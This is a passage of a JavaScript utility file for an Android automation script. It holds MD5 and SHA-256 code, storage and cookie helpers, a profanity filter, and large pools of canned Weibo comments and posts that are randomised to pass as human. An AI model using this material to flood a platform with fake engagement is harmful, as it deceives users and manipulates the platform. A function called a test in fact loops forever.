    b = md5_ff(b, c, d, a, x[i + 15], 22, 1236535329);
    a = md5_gg(a, b, c, d, x[i + 1], 5, -165796510);
    d = md5_gg(d, a, b, c, x[i + 6], 9, -1069501632);
    c = md5_gg(c, d, a, b, x[i + 11], 14, 643717713);
    b = md5_gg(b, c, d, a, x[i + 0], 20, -373897302);
    a = md5_gg(a, b, c, d, x[i + 5], 5, -701558691);
    d = md5_gg(d, a, b, c, x[i + 10], 9, 38016083);
    c = md5_gg(c, d, a, b, x[i + 15], 14, -660478335);
    b = md5_gg(b, c, d, a, x[i + 4], 20, -405537848);
    a = md5_gg(a, b, c, d, x[i + 9], 5, 568446438);
    d = md5_gg(d, a, b, c, x[i + 14], 9, -1019803690);
    c = md5_gg(c, d, a, b, x[i + 3], 14, -187363961);
    b = md5_gg(b, c, d, a, x[i + 8], 20, 1163531501);
    a = md5_gg(a, b, c, d, x[i + 13], 5, -1444681467);
    d = md5_gg(d, a, b, c, x[i + 2], 9, -51403784);
    c = md5_gg(c, d, a, b, x[i + 7], 14, 1735328473);
    b = md5_gg(b, c, d, a, x[i + 12], 20, -1926607734);
    a = md5_hh(a, b, c, d, x[i + 5], 4, -378558);
    d = md5_hh(d, a, b, c, x[i + 8], 11, -2022574463);
    c = md5_hh(c, d, a, b, x[i + 11], 16, 1839030562);
    b = md5_hh(b, c, d, a, x[i + 14], 23, -35309556);
    a = md5_hh(a, b, c, d, x[i + 1], 4, -1530992060);
    d = md5_hh(d, a, b, c, x[i + 4], 11, 1272893353);
    c = md5_hh(c, d, a, b, x[i + 7], 16, -155497632);
    b = md5_hh(b, c, d, a, x[i + 10], 23, -1094730640);
    a = md5_hh(a, b, c, d, x[i + 13], 4, 681279174);
    d = md5_hh(d, a, b, c, x[i + 0], 11, -358537222);
    c = md5_hh(c, d, a, b, x[i + 3], 16, -722521979);
    b = md5_hh(b, c, d, a, x[i + 6], 23, 76029189);
    a = md5_hh(a, b, c, d, x[i + 9], 4, -640364487);
    d = md5_hh(d, a, b, c, x[i + 12], 11, -421815835);
    c = md5_hh(c, d, a, b, x[i + 15], 16, 530742520);
    b = md5_hh(b, c, d, a, x[i + 2], 23, -995338651);
    a = md5_ii(a, b, c, d, x[i + 0], 6, -198630844);
    d = md5_ii(d, a, b, c, x[i + 7], 10, 1126891415);
    c = md5_ii(c, d, a, b, x[i + 14], 15, -1416354905);
    b = md5_ii(b, c, d, a, x[i + 5], 21, -57434055);
    a = md5_ii(a, b, c, d, x[i + 12], 6, 1700485571);
    d = md5_ii(d, a, b, c, x[i + 3], 10, -1894986606);
    c = md5_ii(c, d, a, b, x[i + 10], 15, -1051523);
    b = md5_ii(b, c, d, a, x[i + 1], 21, -2054922799);
    a = md5_ii(a, b, c, d, x[i + 8], 6, 1873313359);
    d = md5_ii(d, a, b, c, x[i + 15], 10, -30611744);
    c = md5_ii(c, d, a, b, x[i + 6], 15, -1560198380);
    b = md5_ii(b, c, d, a, x[i + 13], 21, 1309151649);
    a = md5_ii(a, b, c, d, x[i + 4], 6, -145523070);
    d = md5_ii(d, a, b, c, x[i + 11], 10, -1120210379);
    c = md5_ii(c, d, a, b, x[i + 2], 15, 718787259);
    b = md5_ii(b, c, d, a, x[i + 9], 21, -343485551);
    a = safe_add(a, olda);
    b = safe_add(b, oldb);
    c = safe_add(c, oldc);
    d = safe_add(d, oldd);
  }
  return Array(a, b, c, d);
}
function md5_cmn(q, a, b, x, s, t) {
  return safe_add(bit_rol(safe_add(safe_add(a, q), safe_add(x, t)), s), b);
}
function md5_ff(a, b, c, d, x, s, t) {
  return md5_cmn((b & c) | (~b & d), a, b, x, s, t);
}
function md5_gg(a, b, c, d, x, s, t) {
  return md5_cmn((b & d) | (c & ~d), a, b, x, s, t);
}
function md5_hh(a, b, c, d, x, s, t) {
  return md5_cmn(b ^ c ^ d, a, b, x, s, t);
}
function md5_ii(a, b, c, d, x, s, t) {
  return md5_cmn(c ^ (b | ~d), a, b, x, s, t);
}
function core_hmac_md5(key, data) {
  var bkey = str2binl(key);
  if (bkey.length > 16) bkey = core_md5(bkey, key.length * chrsz);
  var ipad = Array(16),
    opad = Array(16);
  for (var i = 0; i < 16; i++) {
    ipad[i] = bkey[i] ^ 0x36363636;
    opad[i] = bkey[i] ^ 0x5c5c5c5c;
  }
  var hash = core_md5(ipad.concat(str2binl(data)), 512 + data.length * chrsz);
  return core_md5(opad.concat(hash), 512 + 128);
}
function safe_add(x, y) {
  var lsw = (x & 0xffff) + (y & 0xffff);
  var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
  return (msw << 16) | (lsw & 0xffff);
}
function bit_rol(num, cnt) {
  return (num << cnt) | (num >>> (32 - cnt));
}
function str2binl(str) {
  var bin = Array();
  var mask = (1 << chrsz) - 1;
  for (var i = 0; i < str.length * chrsz; i += chrsz)
    bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << i % 32;
  return bin;
}
function binl2str(bin) {
  var str = "";
  var mask = (1 << chrsz) - 1;
  for (var i = 0; i < bin.length * 32; i += chrsz)
    str += String.fromCharCode((bin[i >> 5] >>> i % 32) & mask);
  return str;
}
function binl2hex(binarray) {
  var hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
  var str = "";
  for (var i = 0; i < binarray.length * 4; i++) {
    str +=
      hex_tab.charAt((binarray[i >> 2] >> ((i % 4) * 8 + 4)) & 0xf) +
      hex_tab.charAt((binarray[i >> 2] >> ((i % 4) * 8)) & 0xf);
  }
  return str;
}
function binl2b64(binarray) {
  var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var str = "";
  for (var i = 0; i < binarray.length * 4; i += 3) {
    var triplet =
      (((binarray[i >> 2] >> (8 * (i % 4))) & 0xff) << 16) |
      (((binarray[(i + 1) >> 2] >> (8 * ((i + 1) % 4))) & 0xff) << 8) |
      ((binarray[(i + 2) >> 2] >> (8 * ((i + 2) % 4))) & 0xff);
    for (var j = 0; j < 4; j++) {
      if (i * 8 + j * 6 > binarray.length * 32) str += b64pad;
      else str += tab.charAt((triplet >> (6 * (3 - j))) & 0x3f);
    }
  }
  return str;
}
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
/* SHA256 logical functions */
function rotateRight(n, x) {
  return (x >>> n) | (x << (32 - n));
}
function choice(x, y, z) {
  return (x & y) ^ (~x & z);
}
function majority(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function sha256_Sigma0(x) {
  return rotateRight(2, x) ^ rotateRight(13, x) ^ rotateRight(22, x);
}
function sha256_Sigma1(x) {
  return rotateRight(6, x) ^ rotateRight(11, x) ^ rotateRight(25, x);
}
function sha256_sigma0(x) {
  return rotateRight(7, x) ^ rotateRight(18, x) ^ (x >>> 3);
}
function sha256_sigma1(x) {
  return rotateRight(17, x) ^ rotateRight(19, x) ^ (x >>> 10);
}
function sha256_expand(W, j) {
  return (W[j & 0x0f] +=
    sha256_sigma1(W[(j + 14) & 0x0f]) +
    W[(j + 9) & 0x0f] +
    sha256_sigma0(W[(j + 1) & 0x0f]));
}

/* Hash constant words K: */
var K256 = new Array(
  0x428a2f98,
  0x71374491,
  0xb5c0fbcf,
  0xe9b5dba5,
  0x3956c25b,
  0x59f111f1,
  0x923f82a4,
  0xab1c5ed5,
  0xd807aa98,
  0x12835b01,
  0x243185be,
  0x550c7dc3,
  0x72be5d74,
  0x80deb1fe,
  0x9bdc06a7,
  0xc19bf174,
  0xe49b69c1,
  0xefbe4786,
  0x0fc19dc6,
  0x240ca1cc,
  0x2de92c6f,
  0x4a7484aa,
  0x5cb0a9dc,
  0x76f988da,
  0x983e5152,
  0xa831c66d,
  0xb00327c8,
  0xbf597fc7,
  0xc6e00bf3,
  0xd5a79147,
  0x06ca6351,
  0x14292967,
  0x27b70a85,
  0x2e1b2138,
  0x4d2c6dfc,
  0x53380d13,
  0x650a7354,
  0x766a0abb,
  0x81c2c92e,
  0x92722c85,
  0xa2bfe8a1,
  0xa81a664b,
  0xc24b8b70,
  0xc76c51a3,
  0xd192e819,
  0xd6990624,
  0xf40e3585,
  0x106aa070,
  0x19a4c116,
  0x1e376c08,
  0x2748774c,
  0x34b0bcb5,
  0x391c0cb3,
  0x4ed8aa4a,
  0x5b9cca4f,
  0x682e6ff3,
  0x748f82ee,
  0x78a5636f,
  0x84c87814,
  0x8cc70208,
  0x90befffa,
  0xa4506ceb,
  0xbef9a3f7,
  0xc67178f2
);

/* global arrays */
var ihash, count, buffer;
var sha256_hex_digits = "0123456789abcdef";

/* Initialise the SHA256 computation */
function sha256_init() {
  ihash = new Array(8);
  count = new Array(2);
  buffer = new Array(64);
  count[0] = count[1] = 0;
  ihash[0] = 0x6a09e667;
  ihash[1] = 0xbb67ae85;
  ihash[2] = 0x3c6ef372;
  ihash[3] = 0xa54ff53a;
  ihash[4] = 0x510e527f;
  ihash[5] = 0x9b05688c;
  ihash[6] = 0x1f83d9ab;
  ihash[7] = 0x5be0cd19;
}

/* Transform a 512-bit message block */
function sha256_transform() {
  var a, b, c, d, e, f, g, h, T1, T2;
  var W = new Array(16);

  /* Initialize registers with the previous intermediate value */
  a = ihash[0];
  b = ihash[1];
  c = ihash[2];
  d = ihash[3];
  e = ihash[4];
  f = ihash[5];
  g = ihash[6];
  h = ihash[7];

  /* make 32-bit words */
  for (var i = 0; i < 16; i++)
    W[i] =
      buffer[(i << 2) + 3] |
      (buffer[(i << 2) + 2] << 8) |
      (buffer[(i << 2) + 1] << 16) |
      (buffer[i << 2] << 24);

  for (var j = 0; j < 64; j++) {
    T1 = h + sha256_Sigma1(e) + choice(e, f, g) + K256[j];
    if (j < 16) T1 += W[j];
    else T1 += sha256_expand(W, j);
    T2 = sha256_Sigma0(a) + majority(a, b, c);
    h = g;
    g = f;
    f = e;
    e = safe_add(d, T1);
    d = c;
    c = b;
    b = a;
    a = safe_add(T1, T2);
  }

  /* Compute the current intermediate hash value */
  ihash[0] += a;
  ihash[1] += b;
  ihash[2] += c;
  ihash[3] += d;
  ihash[4] += e;
  ihash[5] += f;
  ihash[6] += g;
  ihash[7] += h;
}

/* Read the next chunk of data and update the SHA256 computation */
function sha256_update(data, inputLen) {
  var i,
    index,
    curpos = 0;
  /* Compute number of bytes mod 64 */
  index = (count[0] >> 3) & 0x3f;
  var remainder = inputLen & 0x3f;

  /* Update number of bits */
  if ((count[0] += inputLen << 3) < inputLen << 3) count[1]++;
  count[1] += inputLen >> 29;

  /* Transform as many times as possible */
  for (i = 0; i + 63 < inputLen; i += 64) {
    for (var j = index; j < 64; j++) buffer[j] = data.charCodeAt(curpos++);
    sha256_transform();
    index = 0;
  }

  /* Buffer remaining input */
  for (var j = 0; j < remainder; j++) buffer[j] = data.charCodeAt(curpos++);
}

/* Finish the computation by operations such as padding */
function sha256_final() {
  var index = (count[0] >> 3) & 0x3f;
  buffer[index++] = 0x80;
  if (index <= 56) {
    for (var i = index; i < 56; i++) buffer[i] = 0;
  } else {
    for (var i = index; i < 64; i++) buffer[i] = 0;
    sha256_transform();
    for (var i = 0; i < 56; i++) buffer[i] = 0;
  }
  buffer[56] = (count[1] >>> 24) & 0xff;
  buffer[57] = (count[1] >>> 16) & 0xff;
  buffer[58] = (count[1] >>> 8) & 0xff;
  buffer[59] = count[1] & 0xff;
  buffer[60] = (count[0] >>> 24) & 0xff;
  buffer[61] = (count[0] >>> 16) & 0xff;
  buffer[62] = (count[0] >>> 8) & 0xff;
  buffer[63] = count[0] & 0xff;
  sha256_transform();
}

/* Split the internal hash values into an array of bytes */
function sha256_encode_bytes() {
  var j = 0;
  var output = new Array(32);
  for (var i = 0; i < 8; i++) {
    output[j++] = (ihash[i] >>> 24) & 0xff;
    output[j++] = (ihash[i] >>> 16) & 0xff;
    output[j++] = (ihash[i] >>> 8) & 0xff;
    output[j++] = ihash[i] & 0xff;
  }
  return output;
}

/* Get the internal hash as a hex string */
function sha256_encode_hex() {
  var output = new String();
  for (var i = 0; i < 8; i++) {
    for (var j = 28; j >= 0; j -= 4)
      output += sha256_hex_digits.charAt((ihash[i] >>> j) & 0x0f);
  }
  return output;
}

/* Main function: returns a hex string representing the SHA256 value of the 
  given data */
function sha256_digest(data) {
  sha256_init();
  sha256_update(data, data.length);
  sha256_final();
  return sha256_encode_hex();
}

/* test if the JS-interpreter is working properly */
function sha256_self_run() {
  var data = 0;
  while (true) {
    sha256_digest("sha" + data);
    data++;
  }
}

//-------------------------

/**
 * 判断是否 不是 空
 * @param {any}} content 内容
 */
function IsNotNullOrEmpty(content) {
  return content != null && content != undefined && Trim(content).length > 0;
}

/**
 * http200验证
 * @param {object} content http返回的json
 */
function Http200(content) {
  return (
    IsNotNullOrEmpty(content) &&
    (content.statusCode == 200 || content.statusCode == "200")
  );
}

/**
 * 去除左右空格
 * @param {string} content
 */
function Trim(content) {
  return (content + "").replace(/(^\s*)|(\s*$)/g, "");
}

/**
 * 存储空间 存入 键值数据
 * @param {string} key 键名
 * @param {any} value 值
 */
function PutSt(key, value) {
  if (value != undefined) {
    StoragePool.put(key, value);
  } else {
  }
}

/**
 * 获取 存储控件中的 数据
 * @param {string} key 键名
 * @param {any} defaultValue 默认值
 */
function GetSt(key, defaultValue) {
  var data = StoragePool.get(key);

  if (IsNotNullOrEmpty(data)) {
    return data;
  } else {
    if (defaultValue == undefined) {
      defaultValue = "";
    }

    return defaultValue;
  }
}

/**
 * 清空存储空间
 */
function ClearStorage() {
  StoragePool.clear();
}

/**
 * 字符串转JSON
 * @param {string} str 字符串
 */
function GetJson(str) {
  return JSON.parse(str);
}

/**
 * 获取UI中的值
 * @param {*} id 界面控件ID
 */
function GetUiText(id) {
  return ui[id].getText() + "";
}

function GetUISwitch(id) {
  return ui[id].checked;
}

/**
 * 获取Cookie
 */
function GetCookieManager() {
  //var versionName = app.autojs.versionName;
  // if (versionName.toString().startsWith("Pro")) {
  //    http.__okhttp__.muteClient(
  //      new OkHttpClient.Builder().cookieJar(web.webkitCookieJar)
  //    );
  //      return  web.cookieManager;
  // } else {
  //http.__okhttp__.muteClient(
  //  new OkHttpClient.Builder().cookieJar(
  //    new org.autojs.autojs.network.util.WebkitCookieManagerProxy()
  //  )
  //);
  return android.webkit.CookieManager.getInstance();
  //}
}

/**
 * 获取随机的 评论内容
 */
function GetRandomCommentContent() {
  var commentArr = new Array();
  commentArr.push("我支持单纯的觉得应该支持一下，比较现在看微博的人越来越少了");
  commentArr.push("我喜欢看评论，评论里面牛人多");
  commentArr.push("支持我看过的没一篇微博");
  commentArr.push("大家都说看评论长见识，可惜今天没遇到大神啊");
  commentArr.push("每次发评论的时候，我都觉得自己很厚道");
  commentArr.push("感谢博主的辛苦创作，送去小星星");
  commentArr.push("趁着这个好机会说点啥");
  commentArr.push("请你原谅我又一次评论了，虽然没什么内容，一个字，支持");
  commentArr.push("评论区里见人才，可惜今天人才不多啊");
  commentArr.push("每当我路过都会留下这么一句话");
  commentArr.push("感谢博主每天的辛苦创作，支持");
  commentArr.push("博主辛苦了，永远支持你");
  commentArr.push("坚持发微博的都不容易，都留一个");
  commentArr.push("我喜欢你们，喜欢你们的评论");
  commentArr.push("现在不喜欢随意评判别人了，就比如这个微博");
  commentArr.push("现在的目标就是奋斗！不过还是支持一下博主先");
  commentArr.push("希望博主每天发多发一些有意义的博文，支持");
  commentArr.push("我爱刷微博，哦偶偶！，楼下的评论有水平");
  commentArr.push("熬夜谁能比过我！我喜欢看评论");
  commentArr.push("想看到神评出现！今天怎么没有啊，不过还是要支持一下博主先");
  commentArr.push("总喜欢在评论里找人生");
  commentArr.push("我知道我的评论质量不高，但我就是想支持一些博主");
  commentArr.push("每次看完都会留点什么");
  commentArr.push("最近不知道为什么，就喜欢发表一下评论");
  commentArr.push("不知道说什么，也想写点什么，证明我来过");
  commentArr.push("有多少人跟我一样不喜欢评论的");
  commentArr.push("最近老犯困！一看微博就不困了");
  commentArr.push("每次路过，都会进来看看你");
  commentArr.push("已经养成习惯，每天都会刷刷微博，支持每一个辛勤发博文的人");
  commentArr.push("永远感觉时间不够用！刷刷微博时间都过去了");
  commentArr.push("每天都纠结，怎么评论啊");
  commentArr.push("很棒的博文，留个位置给我挤挤");
  commentArr.push("喜欢关注你的博文，不需要理由");
  commentArr.push("楼下的都是有眼光的人");
  commentArr.push("出来冒个泡，证明我来过");
  commentArr.push("虽然我的评论质量不高，但也想默默的支持一下");
  commentArr.push("不错不错，我一定要关注你");
  commentArr.push("每天都想来瞅瞅，看看又有啥新鲜事");
  commentArr.push(
    "我很少去评论，因为我是一个不爱说话的人，但是打字不需要说话，所以可以给个赞 "
  );
  commentArr.push("好东西必须分享，就算不分享也要留下我的脚印");

  return commentArr[random(0, commentArr.length - 1)] + GetRandomSymbol();
}

/**
 * 获取内置不变的 文本内容
 */
function GetConstContent() {
  var constContentArr = new Array();

  constContentArr.push("愿一切美好都属于你！");
  constContentArr.push("新的一天又来了！");
  constContentArr.push("为什么总会有一些神奇的存在！");
  constContentArr.push("医生说我最近胃不好，只能吃软饭！");
  constContentArr.push("慢慢喜欢上微博了！");
  constContentArr.push("一刷手机都停不下来，还我美容觉！");
  constContentArr.push("心情不好！");
  constContentArr.push("天气不好，心情也不好！");
  constContentArr.push("空气污染太厉害了！");
  constContentArr.push("我不知道这样的人怎么长这么大的！");
  constContentArr.push("你说你还是喜欢孤单！");
  constContentArr.push("心情很美丽，愿能长久！");
  constContentArr.push("趁着这个好机会说点啥！");
  constContentArr.push("好看的都是别人的！");
  constContentArr.push("心情不好，还是要笑！");
  constContentArr.push("我缺的不是这，是……伟大！");
  constContentArr.push("有没有人请我吃饭！");
  constContentArr.push("好厉害的样子！");
  constContentArr.push("我本来想以正常人的身份跟你相处，奈何！");
  constContentArr.push("任何事情，都要看开，活的潇洒！");
  constContentArr.push("好想天上掉馅饼！");
  constContentArr.push("如果你看了我的微博，我要说，我说的就是你，你，你！");
  constContentArr.push("每当我路过都会留下这么一句话！");
  constContentArr.push("我还有好多地方没有去啊");
  constContentArr.push("这一年为什么不是一个好的开始！");
  constContentArr.push("我希望你能理解我！");
  constContentArr.push("人到中年就是容易感动，呜呜呜！");
  constContentArr.push("喜欢一切美的事物！");
  constContentArr.push("我希望能化作一个太阳，温暖旁人！");
  constContentArr.push("感觉永远放不下手机了！");
  constContentArr.push("我，我，我是不一样的烟火！");
  constContentArr.push("一拿手机根本停不下来！");
  constContentArr.push("谁跟我一样不想成为手机奴的，放下手机！");
  constContentArr.push("世上如果有如果，该多好！");
  constContentArr.push("我喜欢看，不喜欢评论，因为懒！");
  constContentArr.push("我希望成为行动派，可现实却恰恰是理想派。！");
  constContentArr.push("我的粉丝为什么这么少");
  constContentArr.push("我喜欢你们，喜欢你们的评论！");
  constContentArr.push("你好我好大家好！");
  constContentArr.push("没有谁比谁聪明，只有谁比谁懒！");
  constContentArr.push("我们的青春啊！");
  constContentArr.push("怀念我们的青春！");
  constContentArr.push("现在一点小事就会被感动，是年纪大了吗！");
  constContentArr.push("90后现在处于社会什么地位！");
  constContentArr.push("什么时候开始变得感性了，心软！");
  constContentArr.push("现在不喜欢随意评判别人了！");
  constContentArr.push("现在的目标就是奋斗！");
  constContentArr.push("什么也阻挡不了神人的步伐！");
  constContentArr.push("我爱你中国！");
  constContentArr.push("看着看着不自觉的就笑了！");
  constContentArr.push("无聊无聊无聊，真无聊真无聊真无聊！");
  constContentArr.push("熬夜谁能比过我！");
  constContentArr.push("想看到大湿们现身！");
  constContentArr.push("我写的大家能看见吗？！");
  constContentArr.push("我羡慕没心没肺的人！");
  constContentArr.push("总喜欢在微博里找人生！");
  constContentArr.push("我又想发神经的发微博了，快阻止我……！");
  constContentArr.push("照顾好自己，照顾好身边人！");
  constContentArr.push("世间道路数不清，哪一条属于我！");
  constContentArr.push("每次看完都会留点什么！");
  constContentArr.push("最近不知道为什么，总喜欢发呆！");
  constContentArr.push("不知道说什么，也想写点什么，证明我来过！");
  constContentArr.push("把一切不开心都化作动力前进！");
  constContentArr.push("好冷，好像冬眠！好想不工作，只看手机！");
  constContentArr.push("有多少人跟我一样不喜欢评论的！");
  constContentArr.push("最近老犯困！一看手机就不困了！");
  constContentArr.push("每次路过，都会进来看看！");
  constContentArr.push("关注了是不是每次就能看到！");
  constContentArr.push("永远感觉时间不够用！");
  constContentArr.push("每天都纠结，怎么写微博！");
  constContentArr.push("春眠不觉晓，处处闻啼鸟。夜来风雨声，花落知多少。");
  constContentArr.push("君自故乡来，应知故乡事。来日绮窗前，寒梅著花未？");
  constContentArr.push("松下问童子，言师采药去。只在此山中，云深不知处。");
  constContentArr.push(
    "朝辞白帝彩云间，千里江陵一日还。两岸猿声啼不住，轻舟已过万重山。"
  );
  constContentArr.push(
    "独在异乡为异客，每逢佳节倍思亲。遥知兄弟登高处，遍插茱萸少一人。"
  );
  constContentArr.push("白日依山尽，黄河入海流。欲穷千里目，更上一层楼。");
  constContentArr.push(
    "葡萄美酒夜光杯，欲饮琵琶马上催。醉卧沙场君莫笑，古来征战几人回？"
  );
  constContentArr.push(
    "折戟沉沙铁未销，自将磨洗认前朝。东风不与周郎便，铜雀春深锁二乔。"
  );
  constContentArr.push(
    "洞房昨夜停红烛，待晓堂前拜舅姑。妆罢低声问夫婿，画眉深浅入时无？"
  );
  constContentArr.push("打起黄莺儿，莫教枝上啼。啼时惊妾梦，不得到辽西。");
  constContentArr.push("北斗七星高，哥舒夜带刀。至今窥牧马，不敢过临洮。");
  constContentArr.push("故国三千里，深宫二十年。一声何满子，双泪落君前。");
  constContentArr.push("山中相送罢，日暮掩柴扉。春草明年绿，王孙归不归。");
  constContentArr.push("功盖三分国，名成八阵图。江流石不转，遗恨失吞吴。");
  constContentArr.push("红豆生南国，春来发几枝。愿君多采撷，此物最相思。");
  constContentArr.push("空山不见人，但闻人语响。返景入深林，复照青苔上。");
  constContentArr.push(
    "故人西辞黄鹤楼，烟花三月下扬州。孤帆远影碧空尽，唯见长江天际流。"
  );
  constContentArr.push("千山鸟飞绝，万径人踪灭。孤舟蓑笠翁，独钓寒江雪。");
  constContentArr.push(
    "月落乌啼霜满天，江枫渔火对愁眠。姑苏城外寒山寺，夜半钟声到客船。"
  );
  constContentArr.push("移舟泊烟渚，日暮客愁新。野旷天低树，江清月近人。");
  constContentArr.push(
    "朱雀桥边野草花，乌衣巷口夕阳斜。旧时王谢堂前燕，飞入寻常百姓家。"
  );
  constContentArr.push("离离原上草，一岁一枯荣。野火烧不尽，春风吹又生。");
  constContentArr.push("床前明月光，疑是地上霜。举头望明月，低头思故乡。");
  constContentArr.push("国破山河在，城春草木深。感时花溅泪，恨别鸟惊心。");
  constContentArr.push("向晚意不适，驱车登古原。夕阳无限好，只是近黄昏。");
  constContentArr.push(
    "渭城朝雨浥轻尘，客舍青青柳色新。劝君更尽一杯酒，西出阳关无故人。"
  );
  constContentArr.push(
    "剑外忽传收蓟北，初闻涕泪满衣裳。却看妻子愁何在，漫卷诗书喜欲狂。"
  );
  constContentArr.push("独坐幽篁里，弹琴复长啸。深林人不知，明月来相照。");
  constContentArr.push("怀君属秋夜，散步咏凉天。空山松子落，幽人应未眠。");
  constContentArr.push(
    "春城无处不飞花，寒食东风御柳斜。日暮汉宫传蜡烛，轻烟散入五侯家。"
  );
  constContentArr.push(
    "浔阳江头夜送客，枫叶荻花秋瑟瑟。主人下马客在船，举酒欲饮无管弦。"
  );
  constContentArr.push(
    "凤凰台上凤凰游，凤去台空江自流。吴宫花草埋幽径，晋代衣冠成古丘。"
  );
  constContentArr.push("君家何处住，妾住在横塘。停船暂借问，或恐是同乡。");
  constContentArr.push(
    "别梦依依到谢家，小廊回合曲阑斜。多情只有春庭月，犹为离人照落花。"
  );
  constContentArr.push(
    "孔明庙前有老柏，柯如青铜根如石。霜皮溜雨四十围，黛色参天二千尺。"
  );
  constContentArr.push(
    "岐王宅里寻常见，崔九堂前几度闻。正是江南好风景，落花时节又逢君。"
  );
  constContentArr.push("前不见古人，后不见来者。念天地之悠悠，独怆然而涕下。");
  constContentArr.push("孤云将野鹤，岂向人间住。莫买沃洲山，时人已知处。");
  constContentArr.push("苍苍竹林寺，杳杳钟声晚。荷笠带斜阳，青山独归远。");

  return (
    constContentArr[random(0, constContentArr.length - 1)] + GetRandomSymbol()
  );
}

/**
 * 获取随机符号
 */
function GetRandomSymbol() {
  var symbolArr = new Array();
  symbolArr.push("!");
  symbolArr.push("!!");
  symbolArr.push(".");
  symbolArr.push("..");
  symbolArr.push("...");
  symbolArr.push("....");
  symbolArr.push(".....");
  symbolArr.push("......");
  symbolArr.push("。");
  symbolArr.push("。。");
  symbolArr.push("@");
  symbolArr.push("！");
  symbolArr.push("！！");
  symbolArr.push("！！！");
  return symbolArr[random(0, symbolArr.length - 1)];
}

//--------------------------------------

var DirtyWords = [
  "妈",
  "爸",
  "爷",
  "祖宗",
  "狗",
  "蛋",
  "婊",
  "艹",
  "草",
  "滚",
  "死",
  "爬",
  "sb",
  "B",
  "b",
  "操",
  "傻",
  "沙雕",
  "卧槽",
  "逼",
  "鸡",
  "AV",
  "司机",
  "全家",
  "丑",
  "草",
  "b",
  "垃圾",
  "人渣",
  "败类",
  "半身不遂",
  "东西",
  "nmsl",
  "NMSL",
  "交合",
  "乌龟",
  "逼",
  "屎",
  "尿",
  "屁",
  "操",
  "王八",
  "智障",
  "基霸",
  "鸡巴",
  "猪",
  "狗",
  "fuck",
  "Fuck",
  "尼玛",
  "你妈",
  "艹",
  "TMD",
  "婊",
  "麻痹",
  "毒",
  "赌",
  "Sb",
  "滚",
  "锤子",
  "卖批",
  "炮",
  "白粉",
  "鸦片",
  "迷药",
  "针孔",
  "性交",
  "插入",
  "老二",
  "阴茎",
  "鲍鱼",
  "穴",
  "干你",
  "妓",
  "抽插",
  "口",
  "gc",
  "高潮",
  "不要脸",
  "jj",
  "JJ",
  "jiji",
  "鸡",
];

/**
 * 脏字检测
 * @param {*} content
 */
function DirtyWordTesting(content) {
  var res = true;
  if (Cfg.dirtyWordCheck_Switch) {
    if (content.length > 0) {
      for (var i = 0; i < DirtyWords.length; i++) {
        var item = DirtyWords[i];
        if (content.indexOf(item) >= 0) {
          res = false;
          console.log("检查出有脏字: " + item);
          break;
        }
      }
    }
    if (res) {
      console.log("脏字检查通过...");
    }
  }
  return res;
}

/**
 * 时间差    var startTime = new Date();
 * @param {int} startTime
 */
function TimeDis(startTime) {
  var start_time = Date.parse(startTime); //开始时间的时间戳
  var end_time = Date.parse(new Date()); //当前时间的时间戳

  if (end_time < start_time) {
    //  截止时间已过
    return false;
  } else {
    //计算相差天数
    var time_dis = end_time - start_time;
    var days = Math.floor(time_dis / (24 * 3600 * 1000));
    //计算出小时数
    var leave1 = time_dis % (24 * 3600 * 1000); //计算天数后剩余的毫秒数
    var hours = Math.floor(leave1 / (3600 * 1000));
    if (days > 0) {
      hours = hours + days * 24;
    }
    //计算相差分钟数
    var leave2 = leave1 % (3600 * 1000); //计算小时数后剩余的毫秒数
    var minutes = Math.floor(leave2 / (60 * 1000));
    //计算相差秒数
    var leave3 = leave2 % (60 * 1000); //计算小时数后剩余的毫秒数
    var second = leave3 / 1000;
    return hours + "时" + minutes + "分" + second + "秒";
  }
}

/**
 * 定时器
 */
function Timer() {
  /**
   * 定时器池
   */
  var timerPool = Array();

  var func = {};

  /**
   * 初始化定时器
   */
  func.timerSign = function (id) {
    timerPool[id] = new Date().getTime();
  };

  /**
   * 判断定时器是否 到时间
   */
  func.timer = function (id, diff) {
    var nowTime = new Date().getTime();

    if (nowTime - timerPool[id] >= diff * 1000) {
      //重置定时器
      timerPool[id] = new Date().getTime();
      return true;
    } else {
      return false;
    }
  };

  return func;
}

/**
 * 加载设置 配置文件
 */
function LoadSettingConfig() {
  var data = JSON.stringify({
    dirtyWordCheck_Switch: true,
    uiRefreshTime_Text: 30,

    qqPushMsg_Switch: false,
    qqPushMsg_DeviceNickName: "小可爱",
    qqPushMsg_UserNumber: "",
    autoDrawMoney_Switch: false,
    reconnectionSocketLog_Switch: false,
    heartbeatInterval: 5,
    cdk: "",
  });
  if (files.exists(SettingConfigFilePath) == false) {
    log("创建 设置文件");
    files.createWithDirs(SettingConfigFilePath);

    /** 默认值 */
    files.write(SettingConfigFilePath, data);
  }
  data = files.read(SettingConfigFilePath);
  var res = GetJson(data);
  return res;
}

/**
 * 取随机数 (0,10  取出的是 0-9)
 * @param {number} min 最小值(包含)
 * @param {number} max 最大值(不包含)
 */
function GetRandom(min, max) {
  var num = Math.floor(Math.random() * (max - min) + min);
  return num;
}

/**
 * 后缀补 0  (小数点2位)
 * @param {*} x
 */
function SuffixZero(x) {
  var f_x = parseFloat(x);
  if (isNaN(f_x)) {
    return 0;
  }
  var f_x = Math.round(x * 100) / 100;
  var s_x = f_x.toString();
  var pos_decimal = s_x.indexOf(".");
  if (pos_decimal < 0) {
    pos_decimal = s_x.length;
    s_x += ".";
  }
  while (s_x.length <= pos_decimal + 2) {
    s_x += "0";
  }
  return s_x;
}

/**
 * 前缀 补 0
 * @param num： 被操作数
 * @param n： 固定的总位数
 */
function PrefixZero(num, n) {
  return (Array(n).join(0) + num).slice(-n);
}

/**
 *  计算当前时间是否超时
 * @param {string} oldDateTime 对比的原始时间   格式:  2020-04-17 16:46:43   2020/04/17 16:46:43
 * @param {string} calculationAttribute 计算的属性  "year" "month" "day" "hour" "minute" "second"
 * @param {number} num  增减的 数值    例子:    减少 -1   增加 1
 */
function GetTimeOutResult(oldDateTime, calculationAttribute, num) {
  var nowTime = GetFormatDateTime(new Date());

  //替换为斜杠
  var oldTime = new Date(oldDateTime.replace(/-/g, "/"));

  //增减属性
  if (calculationAttribute && calculationAttribute.length > 2) {
